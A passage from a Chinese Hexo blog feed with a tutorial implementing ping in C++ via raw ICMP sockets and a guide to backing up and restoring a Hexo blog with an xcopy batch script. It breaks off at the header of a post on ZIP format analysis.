pIcmp<span class="token operator">-></span>sequence <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token comment">// 填充数据部分</span>
<span class="token function">memcpy</span><span class="token punctuation">(</span>sendBuf <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"abcdelmnopqrstuvwiammekakuactor"</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 计算检验和</span>
pIcmp<span class="token operator">-></span>checkSum <span class="token operator">=</span> <span class="token function">computeCks</span><span class="token punctuation">(</span><span class="token punctuation">(</span>icmpHeader<span class="token operator">*</span><span class="token punctuation">)</span>sendBuf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sendBuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h2 id="发送请求报文"><a href="#发送请求报文" class="headerlink" title="发送请求报文"></a>发送请求报文</h2><p>该部分使用 Socket 编程向指定 IP 地址发送 ICMP 请求报文。需要注意的是，在创建套接字时，需要使用原始套接字，且 protocol 参数为 <code>IPPROTO_ICMP</code>，表明使用 ICMP 协议。<code>SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);</code> 报文发送成功后，接收从客户端发送的回送报文信息。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 初始化套接字库</span>
WORD wReq <span class="token operator">=</span> <span class="token function">MAKEWORD</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
WSADATA wsadata<span class="token punctuation">;</span>
<span class="token function">WSAStartup</span><span class="token punctuation">(</span>wReq<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wsadata<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 填充服务端地址</span>
SOCKADDR_IN serverAddr<span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>serverAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>serverAddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
serverAddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
serverAddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>S_un<span class="token punctuation">.</span>S_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>targetIP<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 创建套接字</span>
SOCKET s <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_RAW<span class="token punctuation">,</span> IPPROTO_ICMP<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>为了得到报文往返的时间，可以在发送前和接收后使用 <code>GetTickCount64()</code> 获取从操作系统启动到现在所经历的的时间 start 和 end，两时间相减得到时间差。</p>
<p>此外，由于 <code>recvfrom()</code> 在未收到报文时将会阻塞，因此可以使用 <code>setsockopt()</code> 设定一个接收超时时间，在超过指定时间未受到数据时返回 -1，表示接收异常。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">setsockopt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> SOL_SOCKET<span class="token punctuation">,</span> SO_RCVTIMEO<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>timeOut<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>timeOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置接收超时</span></code></pre>

<h2 id="解析回送报文"><a href="#解析回送报文" class="headerlink" title="解析回送报文"></a>解析回送报文</h2><p>根据回送的 IP 数据包的指定格式对信息进行解析，IPv4 头部的 4 到 8 位为 IP 报文头部长度，第 9 个字节是 TTL 的值。</p>
<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;winsock.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;thread></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span></span><span class="token string">"ws2_32.lib"</span><span class="token expression"><span class="token punctuation">)</span></span></span>

<span class="token comment">// ICMP 报文头</span>
<span class="token keyword">struct</span> <span class="token class-name">icmpHeader</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> type<span class="token punctuation">;</span> <span class="token comment">// 类型</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> code<span class="token punctuation">;</span> <span class="token comment">// 代码</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> checkSum<span class="token punctuation">;</span> <span class="token comment">// 检验和</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> id<span class="token punctuation">;</span> <span class="token comment">// 标识符</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> sequence<span class="token punctuation">;</span> <span class="token comment">// 序列号</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// 计算检验和</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">computeCks</span><span class="token punctuation">(</span>icmpHeader<span class="token operator">*</span> picmp<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">long</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token operator">*</span> pusicmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token operator">*</span><span class="token punctuation">)</span>picmp<span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		sum <span class="token operator">+=</span> <span class="token operator">*</span><span class="token punctuation">(</span>pusicmp<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span>
			sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		len <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>len<span class="token punctuation">)</span>
		sum <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pusicmp<span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span>
		sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span><span class="token punctuation">)</span><span class="token operator">~</span>sum<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&amp;</span> targetIP<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// 初始化套接字库</span>
	WORD wReq <span class="token operator">=</span> <span class="token function">MAKEWORD</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	WSADATA wsadata<span class="token punctuation">;</span>
	<span class="token function">WSAStartup</span><span class="token punctuation">(</span>wReq<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wsadata<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 填充服务端地址</span>
	SOCKADDR_IN serverAddr<span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>serverAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>serverAddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	serverAddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
	serverAddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>S_un<span class="token punctuation">.</span>S_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>targetIP<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 创建套接字</span>
	SOCKET s <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_RAW<span class="token punctuation">,</span> IPPROTO_ICMP<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// 构造 ICMP 报文</span>
	<span class="token keyword">char</span> sendBuf<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	icmpHeader<span class="token operator">*</span> pIcmp <span class="token operator">=</span> <span class="token punctuation">(</span>icmpHeader<span class="token operator">*</span><span class="token punctuation">)</span>sendBuf<span class="token punctuation">;</span>
	pIcmp<span class="token operator">-></span>type <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
	pIcmp<span class="token operator">-></span>code <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	pIcmp<span class="token operator">-></span>checkSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	pIcmp<span class="token operator">-></span>id <span class="token operator">=</span> <span class="token punctuation">(</span>USHORT<span class="token punctuation">)</span><span class="token double-colon punctuation">::</span><span class="token function">GetCurrentProcessId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pIcmp<span class="token operator">-></span>sequence <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token comment">// 填充数据部分</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span>sendBuf <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"abcdelmnopqrstuvwiammekakuactor"</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 计算检验和</span>
	pIcmp<span class="token operator">-></span>checkSum <span class="token operator">=</span> <span class="token function">computeCks</span><span class="token punctuation">(</span><span class="token punctuation">(</span>icmpHeader<span class="token operator">*</span><span class="token punctuation">)</span>sendBuf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sendBuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// 发送报文</span>
	DWORD start <span class="token operator">=</span> <span class="token function">GetTickCount64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> sendLen <span class="token operator">=</span> <span class="token function">sendto</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> sendBuf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sendBuf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>SOCKADDR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>serverAddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SOCKADDR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>sendLen <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"errno = %d\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 接收报文</span>
	<span class="token keyword">char</span> recvBuf<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	SOCKADDR_IN fromAddr<span class="token punctuation">;</span>
	<span class="token keyword">int</span> fLen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fromAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> timeOut <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span> <span class="token comment">// 超时时间</span>
	<span class="token function">setsockopt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> SOL_SOCKET<span class="token punctuation">,</span> SO_RCVTIMEO<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>timeOut<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>timeOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置接收超时</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> recvBuf<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>SOCKADDR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fromAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请求超时"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
			<span class="token keyword">return</span> INT32_MAX<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	DWORD end <span class="token operator">=</span> <span class="token function">GetTickCount64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	DWORD timeSpan <span class="token operator">=</span> end <span class="token operator">-</span> start<span class="token punctuation">;</span>

	<span class="token comment">// 回送报文解析</span>
	<span class="token keyword">char</span> ipInfo <span class="token operator">=</span> recvBuf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token comment">// ipv4 头部的第 9 个字节为 TTL 的值</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> ttl <span class="token operator">=</span> recvBuf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> ipHeadLen <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ipInfo <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">// IP报文头部长度</span>
	icmpHeader<span class="token operator">*</span> icmpResp <span class="token operator">=</span> <span class="token punctuation">(</span>icmpHeader<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>recvBuf <span class="token operator">+</span> ipHeadLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>icmpResp<span class="token operator">-></span>type <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//回显应答报文</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"来自 %s 的回复：字节=32 时间=%2dms TTL=%d\n"</span><span class="token punctuation">,</span>
			targetIP<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeSpan<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> timeSpan<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请求超时。type = %d\n"</span><span class="token punctuation">,</span> icmpResp<span class="token operator">-></span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> INT32_MAX<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入目的IP地址："</span><span class="token punctuation">;</span>
	std<span class="token double-colon punctuation">::</span>string IP<span class="token punctuation">;</span>
	std<span class="token double-colon punctuation">::</span>cin <span class="token operator">>></span> IP<span class="token punctuation">;</span>
	<span class="token keyword">int</span> maxTime <span class="token operator">=</span> INT32_MIN<span class="token punctuation">,</span> minTime <span class="token operator">=</span> INT32_MAX<span class="token punctuation">,</span> timeSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> acpkgCnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n正在 Ping %s 具有 32 字节的数据:\n"</span><span class="token punctuation">,</span> IP<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		std<span class="token double-colon punctuation">::</span>this_thread<span class="token double-colon punctuation">::</span><span class="token function">sleep_for</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>chrono<span class="token double-colon punctuation">::</span><span class="token function">seconds</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> timeSpan <span class="token operator">=</span> <span class="token function">ping</span><span class="token punctuation">(</span>IP<span class="token punctuation">)</span><span class="token punctuation">;</span>
		acpkgCnt <span class="token operator">+=</span> timeSpan <span class="token operator">!=</span> INT32_MAX<span class="token punctuation">;</span>
		maxTime <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxTime<span class="token punctuation">,</span> timeSpan<span class="token punctuation">)</span><span class="token punctuation">;</span>
		minTime <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>minTime<span class="token punctuation">,</span> timeSpan<span class="token punctuation">)</span><span class="token punctuation">;</span>
		timeSum <span class="token operator">+=</span> timeSpan<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%s 的 Ping 统计信息:\n"</span><span class="token punctuation">,</span> IP<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    数据包: 已发送 = 4，已接收 = %d，丢失 = %d (%d%% 丢失)，\n"</span><span class="token punctuation">,</span>
		acpkgCnt<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">-</span> acpkgCnt<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">-</span> acpkgCnt<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>acpkgCnt<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"往返行程的估计时间(以毫秒为单位):\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"    最短 = %dms，最长 = %dms，平均 = %dms\n"</span><span class="token punctuation">,</span> minTime<span class="token punctuation">,</span> maxTime<span class="token punctuation">,</span> timeSum <span class="token operator">/</span> acpkgCnt<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p><img src="/2022/05/31/Ping%E5%91%BD%E4%BB%A4%E7%9A%84%E5%AE%9E%E7%8E%B0/1.png"></p>
<p>可见，本地与该目的主机的连通性较好。</p>
<p><img src="/2022/05/31/Ping%E5%91%BD%E4%BB%A4%E7%9A%84%E5%AE%9E%E7%8E%B0/2.png"></p>
<p>可见，本地与该目的主机无法连通。</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>Socket编程</tag>
        <tag>Ping</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客的备份与恢复</title>
    <url>/2021/08/25/hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<p>为了防止误操作或计算机崩溃导致的博客源文件丢失，或满足我们更换电脑进行写作的需求，定期进行备份与恢复就显得很重要了。</p>
<span id="more"></span>

<h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><h2 id="需备份的文件目录"><a href="#需备份的文件目录" class="headerlink" title="需备份的文件目录"></a>需备份的文件目录</h2><p>我们在进行备份时，并不需要将整个博客目录全部备份，只备份以下几个用户自定义的即可：scaffolds目录，source目录，themes目录，.gitignore文件，_config.yml文件，package.json文件，其他都是通用的。</p>
<p>首先我们先来观察整个博客目录的结构：</p>
<ul>
<li><p>.deploy_git    本目录会在我们部署时生成，也就是github上保存的文件，无需备份。</p>
</li>
<li><p>node_modules    本目录包含了hexo博客依赖的模块，安装时自动生成，无需备份。</p>
</li>
<li><p>public    与.deploy_git类似，是编译后生成的文件静态网页文件，无需备份。</p>
</li>
<li><p>scaffolds    保存了用户文章的模板，需要备份。</p>
</li>
<li><p>source    保存了用户文章的源文件，需要备份。</p>
</li>
<li><p>themes    保存了用户下载的主题文件与配置，需要备份。</p>
</li>
<li><p>.gitignore    保存了推送到github时忽略的文件名，需要备份。</p>
</li>
<li><p>_config.yml    保存了用户配置信息，需要备份。</p>
</li>
<li><p>db.json    保存了网页的数据文件，在编译生成静态网页时会自动更新，无需备份。</p>
</li>
<li><p>package.json    保存了依赖的模块列表，需要备份。</p>
</li>
<li><p>package-lock.json    保存了依赖的模块安装记录，无需备份。</p>
</li>
</ul>
<h2 id="备份操作"><a href="#备份操作" class="headerlink" title="备份操作"></a>备份操作</h2><p>在了解了需要备份的文件后，就可以进行备份了，可以手动找到这些文件并将其拷贝出来，或者上传到云端，但这样无疑是比较麻烦的。复制这一重复性操作可以编写一个批处理脚本进行操作：</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell">@<span class="token function">echo</span> off
<span class="token function">echo</span> d<span class="token punctuation">|</span>xcopy <span class="token string">"scaffolds"</span> <span class="token string">"../Back-up/MyBlog/scaffolds"</span>  <span class="token operator">/</span>E<span class="token operator">/</span>I<span class="token operator">/</span>Y
<span class="token function">echo</span> d<span class="token punctuation">|</span>xcopy <span class="token string">"source"</span> <span class="token string">"../Back-up/MyBlog/source"</span>  <span class="token operator">/</span>E<span class="token operator">/</span>I<span class="token operator">/</span>Y
<span class="token function">echo</span> d<span class="token punctuation">|</span>xcopy <span class="token string">"themes"</span> <span class="token string">"../Back-up/MyBlog/themes"</span>  <span class="token operator">/</span>E<span class="token operator">/</span>I<span class="token operator">/</span>Y
<span class="token function">echo</span> f<span class="token punctuation">|</span>xcopy <span class="token string">".gitignore"</span> <span class="token string">"../Back-up/MyBlog/.gitignore"</span>  <span class="token operator">/</span>E<span class="token operator">/</span>I<span class="token operator">/</span>Y
<span class="token function">echo</span> f<span class="token punctuation">|</span>xcopy <span class="token string">"_config.yml"</span> <span class="token string">"../Back-up/MyBlog/_config.yml"</span>  <span class="token operator">/</span>E<span class="token operator">/</span>I<span class="token operator">/</span>Y
<span class="token function">echo</span> f<span class="token punctuation">|</span>xcopy <span class="token string">"package.json"</span> <span class="token string">"../Back-up/MyBlog/package.json"</span>  <span class="token operator">/</span>E<span class="token operator">/</span>I<span class="token operator">/</span>Y
<span class="token function">echo</span> 备份完成！
pause</code></pre>

<p>使用xcopy命令来完成复制操作，格式为：xcopy  &lt;需拷贝的文件路径&gt;  &lt;拷贝后的文件路径&gt;，有时系统可能会无法判断路径是文件名还是目录名，在执行时会让用户进行输入选择，输入d是目录名，输入f是文件名。为了防止程序因此中断，我们可以使用管道命令：A | B，表示A命令输出的结果作为B命令的输入。</p>
<p>这样我们便将需要备份的文件拷贝出来了，之后便可以保存在U盘或者上传云端，这里我选择直接将备份的文件夹拖入Onedrive中进行同步，一键操作，简单快捷。</p>
<p><img src="/2021/08/25/hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/Onedrive.png"></p>
<h1 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h1><p>如果电脑上已经安装了hexo博客，由于某些误操作只是想恢复到之前备份的状态的话，只需要将备份的那六个文件和目录覆盖当前博客相应的文件和目录即可。而如果想在其他电脑上恢复博客内容的话，需要进行如下操作：</p>
<h2 id="安装git-bash和node-js"><a href="#安装git-bash和node-js" class="headerlink" title="安装git bash和node.js"></a>安装git bash和node.js</h2><p>安装后可以在cmd中输入<code>git version</code>，<code>node -v</code>，<code>npm -v</code>查看版本来检测是否成功安装。</p>
<p><img src="/2021/08/25/hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/cmd.png"></p>
<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>在cmd中输入<code>npm install -g hexo-cli</code></p>
<h2 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h2><p>在想要保存hexo目录的位置，右键打开git bash here（也可以cmd进入此目录），执行<code>hexo init</code></p>
<h2 id="恢复备份文件"><a href="#恢复备份文件" class="headerlink" title="恢复备份文件"></a>恢复备份文件</h2><p>将备份的六个文件和目录覆盖到当前博客目录，恢复操作完成，可以<code>hexo g</code>，<code>hexo s</code>进行检验。</p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>博客</tag>
        <tag>备份</tag>
        <tag>批处理</tag>
      </tags>
  </entry>
  <entry>
    <title>ZIP格式分析</title>
    <url>/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
